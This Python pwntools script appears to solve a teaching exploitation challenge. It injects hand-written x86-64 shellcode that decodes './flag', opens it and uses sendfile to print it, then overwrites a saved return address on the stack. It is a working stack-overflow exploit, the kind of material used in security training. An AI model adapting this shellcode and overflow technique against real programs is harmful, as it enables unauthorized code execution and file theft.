from pwn import *

# 需要自己写shellcode
context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode():
    ret_addr = p64(0x7fffffffe530)
    shellcode = b""
    shellcode += asm("xor al, al")
    shellcode += asm("mov al, 2")
    shellcode += asm("mov rdi, 0x010166606d672e2f")
    shellcode += asm("mov r8, 0x0101010101010101")
    shellcode += asm("xor rdi, r8")
    shellcode += asm("push rdi")
    shellcode += asm("mov rdi, rsp")
    shellcode += asm("xor esi, esi")
    shellcode += asm("xor edx, edx")
    shellcode += asm("syscall")
    shellcode += asm("mov esi, eax")
    shellcode += asm("mov al, 40")
    shellcode += asm("xor edi, edi")
    shellcode += asm("inc edi")
    shellcode += asm("mov r10w, 0x3e8")
    shellcode += asm("syscall")
    shellcode += asm("mov al, 60")
    shellcode += asm("xor edi, edi")
    shellcode += asm("syscall")
    #shellcode += asm("")
    # 19*8+ret_addr
    shellcode += (19*8-len(shellcode))*b'A' + ret_addr
    return shellcode

if __name__ == '__main__':
    target_name = "./toddler1_level1_teaching1"
    io = process(target_name)
    io.recvuntil(b"size: ")
    shellcode = getshellcode()
    io.sendline(bytes(str(len(shellcode)), encoding='utf8'))
    io.recvuntil(b"!\n")
    io.sendline(shellcode)
    io.interactive()
